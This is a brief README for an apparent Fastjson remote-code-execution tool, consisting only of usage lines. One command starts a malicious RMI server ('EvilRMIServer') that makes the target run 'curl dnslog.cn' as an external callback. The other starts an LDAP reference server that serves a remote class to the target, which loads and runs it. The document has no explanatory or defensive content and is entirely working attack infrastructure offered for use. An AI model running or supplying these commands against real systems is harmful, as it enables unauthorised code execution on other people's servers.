# fastjson_rce_tool

rmi:
java -cp fastjson_tool.jar EvilRMIServer 1099 53 "curl dnslog.cn"


ladp:
java -cp fastjson_tool.jar LDAPRefServer http://ip:port/#Object 8888


